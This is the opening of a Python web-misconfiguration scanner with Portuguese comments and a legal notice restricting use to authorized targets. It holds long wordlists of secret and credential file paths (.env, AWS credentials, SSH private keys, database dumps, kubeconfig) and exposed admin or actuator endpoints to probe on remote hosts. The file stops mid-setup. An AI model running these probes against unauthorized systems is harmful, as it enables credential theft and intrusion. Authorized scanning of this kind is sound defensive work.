#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
misconfig.py - Scanner AGRESSIVO de misconfigurations, sensitive data e
information disclosure para dominios (ou listas de dominios).

Recursos:
  - Descoberta de rotas de API (wordlist grande + parsing de Swagger/OpenAPI)
  - Testes via POST (erros/stack traces, GraphQL introspection, verb tampering)
  - Fuzzing de arquivos sensiveis e de backups
  - Deteccao de segredos/credenciais em corpo de resposta
  - Analise de cabecalhos (seguranca ausente + information disclosure)
  - CORS, metodos HTTP, cookies, TLS/certificado, directory listing
  - Modo verbose (-v / -vv) para acompanhar cada requisicao em tempo real
  - Saida em console colorido + relatorio JSON

AVISO LEGAL: use somente em alvos que voce esta AUTORIZADO a testar
(pentest com contrato, bug bounty no escopo, laboratorios, ativos proprios).
O uso contra terceiros sem autorizacao pode ser crime.
"""

import argparse
import base64
import concurrent.futures
import getpass
import hashlib
import hmac
import html as _html
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
from datetime import datetime, timezone
from http import cookiejar
from urllib.parse import urlparse, urljoin, quote, parse_qsl, urlencode, urlunparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    try:
        from urllib3.util.retry import Retry
    except Exception:  # pragma: no cover
        Retry = None
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    sys.stderr.write("[!] Dependencia ausente: instale com 'pip install requests'\n")
    sys.exit(1)

# dnspython (opcional): habilita recon de DNS, subdomain takeover, AXFR, SPF/DMARC
try:
    import dns.resolver
    import dns.query
    import dns.zone
    HAVE_DNS = True
except ImportError:
    HAVE_DNS = False


# --------------------------------------------------------------------------- #
# Cores (ANSI)
# --------------------------------------------------------------------------- #
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"
    WHITE = "\033[97m"; GREY = "\033[90m"

    @classmethod
    def disable(cls):
        for attr in list(vars(cls)):
            if attr.isupper():
                setattr(cls, attr, "")


SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEVERITY_COLOR = {
    "CRITICAL": lambda: C.MAGENTA + C.BOLD,
    "HIGH": lambda: C.RED + C.BOLD,
    "MEDIUM": lambda: C.YELLOW,
    "LOW": lambda: C.CYAN,
    "INFO": lambda: C.GREY,
}

PRINT_LOCK = threading.Lock()


def p(msg=""):
    """print thread-safe com flush (evita perda de saida quando nao e TTY)."""
    with PRINT_LOCK:
        print(msg, flush=True)


# --------------------------------------------------------------------------- #
# Estatisticas globais
# --------------------------------------------------------------------------- #
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.requests = 0
        self.errors = 0
        self.throttled = 0        # respostas 429/503 observadas
        self.backoff = 0.0        # delay adaptativo global (s), cresce com throttle
        self.backoff_notified = False

    def inc_req(self, n=1):
        with self.lock:
            self.requests += n

    def inc_err(self, n=1):
        with self.lock:
            self.errors += n

    def note_throttle(self):
        """Sinaliza um 429/503: aumenta o backoff adaptativo (ate 5s)."""
        with self.lock:
            self.throttled += 1
            self.backoff = min(5.0, (self.backoff or 0.25) * 1.7)
            first = not self.backoff_notified
            self.backoff_notified = True
            return first, self.backoff

    def note_ok(self):
        """Resposta boa: decai o backoff lentamente."""
        if self.backoff:
            with self.lock:
                self.backoff = max(0.0, self.backoff - 0.05)


STATS = Stats()


# --------------------------------------------------------------------------- #
# Assinaturas / wordlists
# --------------------------------------------------------------------------- #
SECURITY_HEADERS = {
    "strict-transport-security": ("HSTS ausente (Strict-Transport-Security)", "MEDIUM"),
    "content-security-policy": ("CSP ausente (Content-Security-Policy)", "LOW"),
    "x-frame-options": ("X-Frame-Options ausente (clickjacking)", "LOW"),
    "x-content-type-options": ("X-Content-Type-Options ausente (MIME sniffing)", "LOW"),
    "referrer-policy": ("Referrer-Policy ausente", "INFO"),
    "permissions-policy": ("Permissions-Policy ausente", "INFO"),
}

DISCLOSURE_HEADERS = {
    "server": "Versao do servidor exposta (Server)",
    "x-powered-by": "Tecnologia/versao exposta (X-Powered-By)",
    "x-aspnet-version": "Versao do ASP.NET exposta",
    "x-aspnetmvc-version": "Versao do ASP.NET MVC exposta",
    "x-generator": "Gerador/CMS exposto (X-Generator)",
    "x-drupal-cache": "Drupal detectado (X-Drupal-Cache)",
    "x-drupal-dynamic-cache": "Drupal detectado (dynamic-cache)",
    "x-runtime": "Tempo de runtime exposto (X-Runtime)",
    "via": "Proxy/CDN exposto (Via)",
    "x-backend-server": "Servidor backend exposto",
    "x-served-by": "Servidor de origem exposto (X-Served-By)",
    "x-amz-cf-id": "CloudFront exposto",
    "x-hosted-by": "Provedor de hospedagem exposto",
}

# ------ Arquivos sensiveis / info disclosure ------
# (path, descricao, severidade, categoria)
SENSITIVE_PATHS = [
    # VCS
    ("/.git/config", "Repositorio Git exposto (.git/config)", "HIGH", "sensitive_data"),
    ("/.git/HEAD", "Repositorio Git exposto (.git/HEAD)", "HIGH", "sensitive_data"),
    ("/.git/index", "Git index exposto", "HIGH", "sensitive_data"),
    ("/.git/logs/HEAD", "Git logs/HEAD exposto (historico)", "HIGH", "sensitive_data"),
    ("/.gitignore", ".gitignore exposto", "INFO", "info_disclosure"),
    ("/.svn/entries", "Repositorio SVN exposto (.svn)", "HIGH", "sensitive_data"),
    ("/.svn/wc.db", "SVN wc.db exposto", "HIGH", "sensitive_data"),
    ("/.hg/requires", "Repositorio Mercurial exposto (.hg)", "MEDIUM", "sensitive_data"),
    ("/.bzr/README", "Repositorio Bazaar exposto (.bzr)", "MEDIUM", "sensitive_data"),
    ("/CVS/Root", "Repositorio CVS exposto", "MEDIUM", "sensitive_data"),
    # Env / segredos
    ("/.env", ".env exposto (segredos)", "CRITICAL", "sensitive_data"),
    ("/.env.local", ".env.local exposto", "CRITICAL", "sensitive_data"),
    ("/.env.dev", ".env.dev exposto", "CRITICAL", "sensitive_data"),
    ("/.env.development", ".env.development exposto", "CRITICAL", "sensitive_data"),
    ("/.env.prod", ".env.prod exposto", "CRITICAL", "sensitive_data"),
    ("/.env.production", ".env.production exposto", "CRITICAL", "sensitive_data"),
    ("/.env.staging", ".env.staging exposto", "CRITICAL", "sensitive_data"),
    ("/.env.backup", ".env.backup exposto", "CRITICAL", "sensitive_data"),
    ("/.env.example", ".env.example exposto", "LOW", "info_disclosure"),
    ("/.env.save", ".env.save exposto", "CRITICAL", "sensitive_data"),
    ("/app/.env", "app/.env exposto", "CRITICAL", "sensitive_data"),
    ("/api/.env", "api/.env exposto", "CRITICAL", "sensitive_data"),
    ("/config.php", "config.php acessivel", "MEDIUM", "sensitive_data"),
    ("/config.inc.php", "config.inc.php acessivel", "MEDIUM", "sensitive_data"),
    ("/configuration.php", "configuration.php (Joomla) acessivel", "MEDIUM", "sensitive_data"),
    ("/config.json", "config.json acessivel", "MEDIUM", "sensitive_data"),
    ("/config.yml", "config.yml acessivel", "MEDIUM", "sensitive_data"),
    ("/config.yaml", "config.yaml acessivel", "MEDIUM", "sensitive_data"),
    ("/config.xml", "config.xml acessivel", "MEDIUM", "sensitive_data"),
    ("/settings.py", "settings.py (Django) acessivel", "HIGH", "sensitive_data"),
    ("/local_settings.py", "local_settings.py acessivel", "HIGH", "sensitive_data"),
    ("/appsettings.json", "appsettings.json (.NET) acessivel", "HIGH", "sensitive_data"),
    ("/appsettings.Development.json", "appsettings.Development.json acessivel", "HIGH", "sensitive_data"),
    ("/web.config", "web.config exposto", "MEDIUM", "sensitive_data"),
    ("/wp-config.php.bak", "Backup de wp-config.php exposto", "CRITICAL", "sensitive_data"),
    ("/wp-config.php~", "Backup de wp-config.php (~) exposto", "CRITICAL", "sensitive_data"),
    ("/wp-config.php.save", "Backup de wp-config.php (.save) exposto", "CRITICAL", "sensitive_data"),
    ("/wp-config.php.orig", "Backup de wp-config.php (.orig) exposto", "CRITICAL", "sensitive_data"),
    ("/wp-config.php.old", "Backup de wp-config.php (.old) exposto", "CRITICAL", "sensitive_data"),
    ("/.aws/credentials", "Credenciais AWS expostas", "CRITICAL", "sensitive_data"),
    ("/.aws/config", "Config AWS exposta", "HIGH", "sensitive_data"),
    ("/.npmrc", ".npmrc exposto (tokens npm)", "HIGH", "sensitive_data"),
    ("/.pypirc", ".pypirc exposto (creds PyPI)", "HIGH", "sensitive_data"),
    ("/.dockercfg", "Docker cfg exposto", "HIGH", "sensitive_data"),
    ("/.docker/config.json", "Docker config.json exposto", "HIGH", "sensitive_data"),
    ("/docker-compose.yml", "docker-compose.yml exposto", "MEDIUM", "sensitive_data"),
    ("/docker-compose.yaml", "docker-compose.yaml exposto", "MEDIUM", "sensitive_data"),
    ("/Dockerfile", "Dockerfile exposto", "LOW", "info_disclosure"),
    ("/.htpasswd", ".htpasswd exposto (hashes)", "CRITICAL", "sensitive_data"),
    ("/.htaccess", ".htaccess exposto", "MEDIUM", "info_disclosure"),
    ("/credentials.json", "credentials.json exposto", "CRITICAL", "sensitive_data"),
    ("/secrets.json", "secrets.json exposto", "CRITICAL", "sensitive_data"),
    ("/secrets.yml", "secrets.yml exposto", "CRITICAL", "sensitive_data"),
    ("/secrets.yaml", "secrets.yaml exposto", "CRITICAL", "sensitive_data"),
    ("/id_rsa", "Chave privada SSH exposta (id_rsa)", "CRITICAL", "sensitive_data"),
    ("/.ssh/id_rsa", "Chave privada SSH exposta (.ssh/id_rsa)", "CRITICAL", "sensitive_data"),
    ("/.ssh/id_dsa", "Chave privada SSH exposta (id_dsa)", "CRITICAL", "sensitive_data"),
    ("/.ssh/authorized_keys", "authorized_keys exposto", "HIGH", "sensitive_data"),
    ("/.netrc", ".netrc exposto (creds)", "HIGH", "sensitive_data"),
    ("/.git-credentials", ".git-credentials exposto", "CRITICAL", "sensitive_data"),
    ("/.bash_history", ".bash_history exposto", "MEDIUM", "info_disclosure"),
    ("/.mysql_history", ".mysql_history exposto", "MEDIUM", "info_disclosure"),
    ("/composer.json", "composer.json exposto", "LOW", "info_disclosure"),
    ("/composer.lock", "composer.lock exposto", "LOW", "info_disclosure"),
    ("/package.json", "package.json exposto", "INFO", "info_disclosure"),
    ("/package-lock.json", "package-lock.json exposto", "INFO", "info_disclosure"),
    ("/yarn.lock", "yarn.lock exposto", "INFO", "info_disclosure"),
    ("/Gemfile", "Gemfile exposto", "INFO", "info_disclosure"),
    ("/Gemfile.lock", "Gemfile.lock exposto", "INFO", "info_disclosure"),
    ("/requirements.txt", "requirements.txt exposto", "INFO", "info_disclosure"),
    ("/.terraform/terraform.tfstate", "terraform.tfstate exposto (segredos)", "CRITICAL", "sensitive_data"),
    ("/terraform.tfstate", "terraform.tfstate exposto (segredos)", "CRITICAL", "sensitive_data"),
    ("/terraform.tfvars", "terraform.tfvars exposto", "HIGH", "sensitive_data"),
    ("/.vscode/sftp.json", "Config SFTP do VSCode exposta", "HIGH", "sensitive_data"),
    ("/.idea/workspace.xml", "Config do IntelliJ exposta", "LOW", "info_disclosure"),
    ("/.idea/dataSources.xml", "dataSources do IntelliJ (creds DB)", "HIGH", "sensitive_data"),
    # Backups / dumps
    ("/backup.zip", "Backup exposto (backup.zip)", "HIGH", "sensitive_data"),
    ("/backup.tar.gz", "Backup exposto (backup.tar.gz)", "HIGH", "sensitive_data"),
    ("/backup.tar", "Backup exposto (backup.tar)", "HIGH", "sensitive_data"),
    ("/backup.rar", "Backup exposto (backup.rar)", "HIGH", "sensitive_data"),
    ("/backup.sql", "Dump de banco exposto (backup.sql)", "CRITICAL", "sensitive_data"),
    ("/backup.sql.gz", "Dump de banco exposto (backup.sql.gz)", "CRITICAL", "sensitive_data"),
    ("/database.sql", "Dump de banco exposto (database.sql)", "CRITICAL", "sensitive_data"),
    ("/db.sql", "Dump de banco exposto (db.sql)", "CRITICAL", "sensitive_data"),
    ("/dump.sql", "Dump de banco exposto (dump.sql)", "CRITICAL", "sensitive_data"),
    ("/mysql.sql", "Dump de banco exposto (mysql.sql)", "CRITICAL", "sensitive_data"),
    ("/site.sql", "Dump de banco exposto (site.sql)", "CRITICAL", "sensitive_data"),
    ("/www.zip", "Backup do site exposto (www.zip)", "HIGH", "sensitive_data"),
    ("/site.zip", "Backup do site exposto (site.zip)", "HIGH", "sensitive_data"),
    ("/web.zip", "Backup do site exposto (web.zip)", "HIGH", "sensitive_data"),
    ("/html.zip", "Backup do site exposto (html.zip)", "HIGH", "sensitive_data"),
    ("/public_html.zip", "Backup do site exposto (public_html.zip)", "HIGH", "sensitive_data"),
    ("/backup.bak", "Arquivo de backup exposto (.bak)", "MEDIUM", "sensitive_data"),
    ("/app.zip", "Backup da aplicacao (app.zip)", "HIGH", "sensitive_data"),
    ("/release.zip", "Backup de release (release.zip)", "HIGH", "sensitive_data"),
    # Debug / info
    ("/phpinfo.php", "phpinfo() exposto", "HIGH", "info_disclosure"),
    ("/info.php", "phpinfo() exposto (info.php)", "HIGH", "info_disclosure"),
    ("/test.php", "test.php acessivel", "LOW", "info_disclosure"),
    ("/server-status", "Apache server-status exposto", "MEDIUM", "info_disclosure"),
    ("/server-info", "Apache server-info exposto", "MEDIUM", "info_disclosure"),
    ("/nginx_status", "Nginx status exposto", "MEDIUM", "info_disclosure"),
    ("/status", "Endpoint /status exposto", "LOW", "info_disclosure"),
    ("/.DS_Store", ".DS_Store exposto (listagem de arquivos)", "LOW", "info_disclosure"),
    ("/Thumbs.db", "Thumbs.db exposto", "INFO", "info_disclosure"),
    ("/robots.txt", "robots.txt (revisar paths)", "INFO", "info_disclosure"),
    ("/sitemap.xml", "sitemap.xml disponivel", "INFO", "info_disclosure"),
    ("/humans.txt", "humans.txt disponivel", "INFO", "info_disclosure"),
    ("/crossdomain.xml", "crossdomain.xml (revisar wildcard)", "LOW", "misconfig"),
    ("/clientaccesspolicy.xml", "clientaccesspolicy.xml (revisar)", "LOW", "misconfig"),
    ("/.well-known/security.txt", "security.txt presente", "INFO", "info_disclosure"),
    ("/trace.axd", "ASP.NET trace.axd exposto", "HIGH", "info_disclosure"),
    ("/elmah.axd", "ELMAH exposto (logs de erro)", "HIGH", "info_disclosure"),
    ("/debug", "Endpoint /debug acessivel", "MEDIUM", "info_disclosure"),
    ("/debug/pprof/", "Go pprof debug exposto", "HIGH", "info_disclosure"),
    ("/_profiler/", "Symfony profiler exposto", "HIGH", "info_disclosure"),
    ("/telescope/requests", "Laravel Telescope exposto", "HIGH", "info_disclosure"),
    ("/wp-json/wp/v2/users", "Enumeracao de usuarios WordPress (wp-json)", "MEDIUM", "info_disclosure"),
    # /?author=1 removido: dava falso positivo em qualquer site que retorna 200 (catch-all/SPA).
    # A enumeracao real de usuarios WP e coberta por /wp-json/wp/v2/users (JSON so em WP real).
    # Logs
    ("/error.log", "error.log exposto", "MEDIUM", "info_disclosure"),
    ("/error_log", "error_log exposto", "MEDIUM", "info_disclosure"),
    ("/access.log", "access.log exposto", "MEDIUM", "info_disclosure"),
    ("/debug.log", "debug.log exposto", "MEDIUM", "info_disclosure"),
    ("/logs/error.log", "logs/error.log exposto", "MEDIUM", "info_disclosure"),
    ("/laravel.log", "laravel.log exposto", "MEDIUM", "info_disclosure"),
    ("/storage/logs/laravel.log", "storage/logs/laravel.log exposto", "HIGH", "info_disclosure"),
    ("/npm-debug.log", "npm-debug.log exposto", "LOW", "info_disclosure"),
    # Chaves / certificados
    ("/server.key", "Chave privada TLS exposta (server.key)", "CRITICAL", "sensitive_data"),
    ("/private.key", "Chave privada exposta (private.key)", "CRITICAL", "sensitive_data"),
    ("/privatekey.pem", "Chave privada exposta (privatekey.pem)", "CRITICAL", "sensitive_data"),
    ("/key.pem", "Chave privada exposta (key.pem)", "CRITICAL", "sensitive_data"),
    ("/server.pem", "Certificado/chave exposto (server.pem)", "HIGH", "sensitive_data"),
    ("/.well-known/acme-challenge/", "Diretorio ACME challenge", "INFO", "info_disclosure"),
    # Frameworks / configs adicionais
    ("/config/database.yml", "database.yml (Rails) exposto", "HIGH", "sensitive_data"),
    ("/config/secrets.yml", "secrets.yml (Rails) exposto", "CRITICAL", "sensitive_data"),
    ("/config/master.key", "Rails master.key exposto", "CRITICAL", "sensitive_data"),
    ("/config/credentials.yml.enc", "Rails credentials exposto", "HIGH", "sensitive_data"),
    ("/WEB-INF/web.xml", "web.xml (Java) exposto", "HIGH", "sensitive_data"),
    ("/WEB-INF/classes/", "WEB-INF/classes exposto", "HIGH", "sensitive_data"),
    ("/META-INF/MANIFEST.MF", "MANIFEST.MF exposto", "LOW", "info_disclosure"),
    ("/storage/.env", "storage/.env exposto", "CRITICAL", "sensitive_data"),
    ("/vendor/composer/installed.json", "installed.json (versoes) exposto", "LOW", "info_disclosure"),
    ("/sftp-config.json", "sftp-config.json exposto (creds)", "HIGH", "sensitive_data"),
    ("/ftp-config.json", "ftp-config.json exposto (creds)", "HIGH", "sensitive_data"),
    ("/deploy.php", "deploy.php acessivel", "MEDIUM", "misconfig"),
    ("/phpunit.xml", "phpunit.xml exposto", "LOW", "info_disclosure"),
    # CI/CD
    ("/.circleci/config.yml", "CircleCI config exposto", "LOW", "info_disclosure"),
    ("/.gitlab-ci.yml", "GitLab CI config exposto", "LOW", "info_disclosure"),
    ("/.travis.yml", "Travis CI config exposto", "LOW", "info_disclosure"),
    ("/Jenkinsfile", "Jenkinsfile exposto", "LOW", "info_disclosure"),
    ("/.drone.yml", "Drone CI config exposto", "LOW", "info_disclosure"),
    ("/bitbucket-pipelines.yml", "Bitbucket Pipelines exposto", "LOW", "info_disclosure"),
    # Paineis / DB admin
    ("/adminer.php", "Adminer (DB admin) exposto", "HIGH", "misconfig"),
    ("/adminer", "Adminer (DB admin) exposto", "HIGH", "misconfig"),
    ("/phpmyadmin/", "phpMyAdmin exposto", "MEDIUM", "misconfig"),
    ("/phpMyAdmin/", "phpMyAdmin exposto", "MEDIUM", "misconfig"),
    ("/pma/", "phpMyAdmin exposto (pma)", "MEDIUM", "misconfig"),
    ("/dbadmin/", "DB admin exposto", "MEDIUM", "misconfig"),
    ("/wp-login.php", "WordPress login exposto", "INFO", "info_disclosure"),
    ("/wp-admin/", "WordPress admin acessivel", "INFO", "info_disclosure"),
    ("/xmlrpc.php", "WordPress XML-RPC habilitado (amplificacao/bruteforce)", "LOW", "misconfig"),
    ("/solr/", "Apache Solr admin exposto", "HIGH", "misconfig"),
    ("/kibana/", "Kibana exposto", "MEDIUM", "misconfig"),
    ("/_plugin/kibana/", "Kibana (via ES) exposto", "MEDIUM", "misconfig"),
    ("/grafana/", "Grafana exposto", "LOW", "misconfig"),
    ("/rabbitmq/", "RabbitMQ mgmt exposto", "MEDIUM", "misconfig"),
    # Diretorios comuns (indexacao/arquivos)
    ("/backup/", "Diretorio /backup", "LOW", "info_disclosure"),
    ("/backups/", "Diretorio /backups", "LOW", "info_disclosure"),
    ("/old/", "Diretorio /old", "LOW", "info_disclosure"),
    ("/temp/", "Diretorio /temp", "INFO", "info_disclosure"),
    ("/uploads/", "Diretorio /uploads", "INFO", "info_disclosure"),
    ("/files/", "Diretorio /files", "INFO", "info_disclosure"),
    ("/logs/", "Diretorio /logs", "LOW", "info_disclosure"),
    ("/private/", "Diretorio /private", "LOW", "info_disclosure"),
    ("/cgi-bin/", "cgi-bin acessivel", "INFO", "info_disclosure"),
    # Bancos de dados locais / arquivos de dados
    ("/database.sqlite", "SQLite exposto (database.sqlite)", "CRITICAL", "sensitive_data"),
    ("/db.sqlite3", "SQLite exposto (db.sqlite3)", "CRITICAL", "sensitive_data"),
    ("/database.db", "Banco exposto (database.db)", "CRITICAL", "sensitive_data"),
    ("/data.db", "Banco exposto (data.db)", "CRITICAL", "sensitive_data"),
    ("/app.db", "Banco exposto (app.db)", "CRITICAL", "sensitive_data"),
    ("/sqlite.db", "Banco exposto (sqlite.db)", "CRITICAL", "sensitive_data"),
    ("/dump.rdb", "Redis dump exposto (dump.rdb)", "HIGH", "sensitive_data"),
    ("/database.yml", "database.yml exposto", "HIGH", "sensitive_data"),
    ("/db_backup.sql", "Dump de banco exposto (db_backup.sql)", "CRITICAL", "sensitive_data"),
    ("/users.sql", "Dump de usuarios exposto (users.sql)", "CRITICAL", "sensitive_data"),
    ("/data.sql", "Dump de banco exposto (data.sql)", "CRITICAL", "sensitive_data"),
    ("/localhost.sql", "Dump de banco exposto (localhost.sql)", "CRITICAL", "sensitive_data"),
    # Certificados / keystores
    ("/keystore.jks", "Java keystore exposto (keystore.jks)", "HIGH", "sensitive_data"),
    ("/cert.pfx", "Certificado PFX exposto (cert.pfx)", "HIGH", "sensitive_data"),
    ("/certificate.p12", "Certificado P12 exposto", "HIGH", "sensitive_data"),
    # Config extra
    ("/parameters.yml", "parameters.yml (Symfony) exposto", "HIGH", "sensitive_data"),
    ("/.env.vault", ".env.vault exposto", "HIGH", "sensitive_data"),
    ("/nginx.conf", "nginx.conf exposto", "MEDIUM", "info_disclosure"),
    ("/httpd.conf", "httpd.conf exposto", "MEDIUM", "info_disclosure"),
    ("/php.ini", "php.ini exposto", "MEDIUM", "info_disclosure"),
    ("/.user.ini", ".user.ini exposto", "LOW", "info_disclosure"),
    ("/aws.yml", "aws.yml exposto (creds)", "HIGH", "sensitive_data"),
    ("/.s3cfg", ".s3cfg exposto (creds S3)", "HIGH", "sensitive_data"),
    ("/.boto", ".boto exposto (creds GCP/S3)", "HIGH", "sensitive_data"),
    ("/serviceaccount.json", "Service account GCP exposto", "CRITICAL", "sensitive_data"),
    ("/gcp-credentials.json", "Credenciais GCP expostas", "CRITICAL", "sensitive_data"),
    ("/firebase.json", "firebase.json exposto", "LOW", "info_disclosure"),
    ("/.firebaserc", ".firebaserc exposto", "LOW", "info_disclosure"),
    ("/kube/config", "kubeconfig exposto", "CRITICAL", "sensitive_data"),
    ("/.kube/config", ".kube/config exposto", "CRITICAL", "sensitive_data"),
    ("/ansible.cfg", "ansible.cfg exposto", "LOW", "info_disclosure"),
    ("/inventory", "Ansible inventory exposto", "LOW", "info_disclosure"),
    ("/vault-token", "Vault token exposto", "CRITICAL", "sensitive_data"),
]

# ------ Rotas de API (descoberta) ------
# (path, descricao_base). GET + analise; JSON 200 relevante vira achado.
API_PATHS = [
    ("/api", "Endpoint /api"),
    ("/api/", "Endpoint /api/"),
    ("/api/v1", "API v1"),
    ("/api/v2", "API v2"),
    ("/api/v3", "API v3"),
    ("/api/v1/", "API v1"),
    ("/api/v2/", "API v2"),
    ("/v1", "API /v1"),
    ("/v2", "API /v2"),
    ("/rest", "Endpoint REST"),
    ("/rest/v1", "REST v1"),
    ("/graphql", "GraphQL endpoint"),
    ("/api/graphql", "GraphQL endpoint (api)"),
    ("/graphiql", "GraphiQL IDE"),
    ("/playground", "GraphQL Playground"),
    ("/query", "Endpoint /query"),
    ("/gql", "Endpoint /gql"),
    ("/api/users", "API /users"),
    ("/api/user", "API /user"),
    ("/api/v1/users", "API v1/users"),
    ("/api/v2/users", "API v2/users"),
    ("/api/admin", "API /admin"),
    ("/api/accounts", "API /accounts"),
    ("/api/customers", "API /customers"),
    ("/api/orders", "API /orders"),
    ("/api/products", "API /products"),
    ("/api/config", "API /config"),
    ("/api/settings", "API /settings"),
    ("/api/login", "API /login"),
    ("/api/auth", "API /auth"),
    ("/api/token", "API /token"),
    ("/api/register", "API /register"),
    ("/api/keys", "API /keys"),
    ("/api/secrets", "API /secrets"),
    ("/api/debug", "API /debug"),
    ("/api/internal", "API /internal"),
    ("/api/private", "API /private"),
    ("/api/status", "API /status"),
    ("/api/health", "API /health"),
    ("/api/version", "API /version"),
    ("/api/info", "API /info"),
    ("/api/swagger.json", "Swagger JSON (api)"),
    ("/api/openapi.json", "OpenAPI JSON (api)"),
    ("/api/v1/swagger.json", "Swagger JSON v1"),
    ("/swagger.json", "Swagger JSON"),
    ("/swagger/v1/swagger.json", "Swagger JSON (swagger/v1)"),
    ("/openapi.json", "OpenAPI JSON"),
    ("/openapi.yaml", "OpenAPI YAML"),
    ("/api-docs", "API docs"),
    ("/api/docs", "API docs (api)"),
    ("/api/v1/docs", "API v1 docs"),
    ("/docs", "Docs"),
    ("/redoc", "ReDoc"),
    ("/swagger-ui.html", "Swagger UI"),
    ("/swagger/index.html", "Swagger UI (index)"),
    ("/swagger-ui/index.html", "Swagger UI (swagger-ui)"),
    ("/swagger-resources", "Swagger resources"),
    ("/wp-json", "WordPress REST API"),
    ("/wp-json/wp/v2", "WordPress REST v2"),
    ("/index.php?rest_route=/", "WordPress REST (rest_route)"),
    ("/health", "Health check"),
    ("/healthz", "Health check (k8s)"),
    ("/ready", "Readiness probe"),
    ("/readyz", "Readiness probe (z)"),
    ("/livez", "Liveness probe"),
    ("/metrics", "Prometheus metrics"),
    ("/actuator", "Spring Boot Actuator"),
    ("/actuator/health", "Actuator health"),
    ("/actuator/info", "Actuator info"),
    ("/actuator/env", "Actuator env (variaveis)"),
    ("/actuator/configprops", "Actuator configprops"),
    ("/actuator/beans", "Actuator beans"),
    ("/actuator/mappings", "Actuator mappings"),
    ("/actuator/heapdump", "Actuator heapdump"),
    ("/actuator/threaddump", "Actuator threaddump"),
    ("/actuator/loggers", "Actuator loggers"),
    ("/actuator/httptrace", "Actuator httptrace"),
    ("/actuator/metrics", "Actuator metrics"),
    ("/actuator/gateway/routes", "Actuator gateway routes"),
    ("/.well-known/openid-configuration", "OpenID configuration"),
    ("/.well-known/oauth-authorization-server", "OAuth AS metadata"),
    ("/.well-known/assetlinks.json", "assetlinks.json"),
    ("/.well-known/apple-app-site-association", "apple-app-site-association"),
    ("/console", "Console web"),
    ("/admin", "Painel admin"),
    ("/administrator", "Painel admin (Joomla)"),
    ("/manager/html", "Tomcat Manager"),
    ("/jolokia", "Jolokia (JMX) exposto"),
    ("/env", "Endpoint /env"),
    ("/config", "Endpoint /config"),
    ("/api/v1/namespaces", "Kubernetes API"),
    ("/v2/_catalog", "Docker Registry catalog"),
    # Bancos/infra com API HTTP (frequentemente expostos sem auth)
    ("/_cat/indices", "Elasticsearch _cat/indices"),
    ("/_cluster/health", "Elasticsearch cluster health"),
    ("/_search", "Elasticsearch _search"),
    ("/_all/_search", "Elasticsearch _all/_search"),
    ("/_nodes", "Elasticsearch _nodes"),
    ("/_snapshot", "Elasticsearch _snapshot"),
    ("/v1/kv/", "Consul KV store"),
    ("/v1/catalog/services", "Consul services"),
    ("/v1/agent/self", "Consul agent"),
    ("/v1/sys/health", "HashiCorp Vault health"),
    ("/v1/sys/seal-status", "Vault seal-status"),
    ("/version", "Endpoint /version (etcd/infra)"),
    ("/v2/keys/", "etcd v2 keys"),
    ("/debug/vars", "Go expvar (/debug/vars)"),
    ("/debug/pprof/", "Go pprof"),
    ("/api/v1/query?query=up", "Prometheus query API"),
    ("/prometheus/", "Prometheus UI"),
    ("/graph", "Prometheus/Grafana graph"),
    ("/druid/", "Apache Druid console"),
    ("/hystrix", "Hystrix dashboard"),
    ("/hystrix.stream", "Hystrix stream"),
    ("/jenkins/", "Jenkins"),
    ("/script", "Jenkins/Groovy console"),
    ("/computer/api/json", "Jenkins nodes API"),
    ("/gitlab/", "GitLab"),
    ("/api/v4/projects", "GitLab API projects"),
    ("/nifi/", "Apache NiFi"),
    ("/zabbix/", "Zabbix"),
    ("/wp-json/wp/v2/pages", "WordPress pages API"),
    ("/api/now/table", "ServiceNow table API"),
    ("/services/Soap/", "SOAP services"),
    ("/service.asmx", "ASMX web service"),
    ("/api.asmx?WSDL", "ASMX WSDL"),
    ("/soap?wsdl", "SOAP WSDL"),
    ("/odata/", "OData endpoint"),
    ("/odata/$metadata", "OData metadata"),
    ("/api/$metadata", "OData metadata (api)"),
    ("/trpc", "tRPC endpoint"),
    ("/rpc", "RPC endpoint"),
    ("/.json", "Rota .json (Rails/index)"),
    ("/sitemap_index.xml", "Sitemap index"),
    ("/feed", "Feed RSS/Atom"),
    ("/rss", "Feed RSS"),
    ("/telescope", "Laravel Telescope"),
    ("/horizon", "Laravel Horizon"),
    ("/_ignition/health-check", "Laravel Ignition (RCE CVE-2021-3129)"),
    ("/flower/", "Celery Flower"),
    ("/bull/", "BullMQ dashboard"),
    ("/minio/", "MinIO console"),
    ("/rest/api/2/serverInfo", "Jira REST API"),
    ("/rest/api/1.0/", "Bitbucket/Confluence REST"),
    ("/api/v1/pods", "Kubernetes pods API"),
    ("/healthz/ready", "k8s readiness"),
]

# ------ Severidade default para achados de API por tipo ------
# Endpoints que, se acessiveis/JSON, sao mais sensiveis:
API_HIGH_VALUE = {
    "/actuator/env": ("CRITICAL", "sensitive_data", "Actuator env exposto (variaveis/segredos)"),
    "/actuator/heapdump": ("CRITICAL", "sensitive_data", "Actuator heapdump exposto (memoria)"),
    "/actuator/configprops": ("HIGH", "sensitive_data", "Actuator configprops exposto"),
    "/actuator/threaddump": ("HIGH", "info_disclosure", "Actuator threaddump exposto"),
    "/actuator/httptrace": ("HIGH", "info_disclosure", "Actuator httptrace exposto (requests)"),
    "/actuator/mappings": ("MEDIUM", "info_disclosure", "Actuator mappings exposto (rotas)"),
    "/actuator/beans": ("MEDIUM", "info_disclosure", "Actuator beans exposto"),
    "/actuator/gateway/routes": ("HIGH", "info_disclosure", "Actuator gateway routes exposto"),
    "/actuator": ("MEDIUM", "misconfig", "Spring Boot Actuator exposto"),
    "/jolokia": ("HIGH", "misconfig", "Jolokia (JMX) exposto"),
    "/metrics": ("MEDIUM", "info_disclosure", "Prometheus /metrics exposto"),
    "/v2/_catalog": ("HIGH", "sensitive_data", "Docker Registry catalog exposto"),
    "/manager/html": ("HIGH", "misconfig", "Tomcat Manager exposto"),
    "/wp-json/wp/v2/users": ("MEDIUM", "info_disclosure", "Enumeracao de usuarios WordPress"),
}

# Endpoints candidatos a teste POST (com corpo). (path, body_type)
